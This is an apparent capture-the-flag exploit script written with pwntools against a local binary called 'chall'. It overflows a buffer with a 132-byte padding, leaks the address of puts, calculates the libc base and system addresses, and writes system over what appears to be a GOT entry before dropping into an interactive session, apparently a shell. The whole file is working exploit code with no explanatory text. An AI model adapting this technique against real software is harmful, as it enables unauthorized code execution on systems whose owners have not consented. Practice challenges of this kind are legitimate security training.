from pwn import *

context.binary = './chall'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./chall')

# gdb.attach(p)

offset = 132

p.sendline(b'1')
sleep(0.1)

payload =  offset * b'A'
payload += p64(0x404008)

p.sendline(payload)
sleep(0.1)

p.recvlines(3)

leak = p.recvline().strip().split(b':00 - ')
print(leak)

low = leak[0]
low_int = int(low)
low_hex = hex(low_int)
print(low_hex)

high = leak[1]
high_int = u16(high)
high_hex = hex(high_int)
print(high_hex)

full_puts_leak = (high_int << 32) | low_int
print(hex(full_puts_leak))

base_libc = full_puts_leak - libc.symbols.puts
print(hex(base_libc))

system = base_libc + libc.symbols.system
print(hex(system))

low_system_int = system & 0xFFFFFFFF
high_system_int = (system >> 32) & 0xFFFFFFFF

print(hex(low_system_int))
print(low_system_int)
print(hex(high_system_int))
print(high_int)

p.sendline(str(low_system_int).encode())
sleep(0.1)
p.sendline(p16(high_system_int))

p.interactive()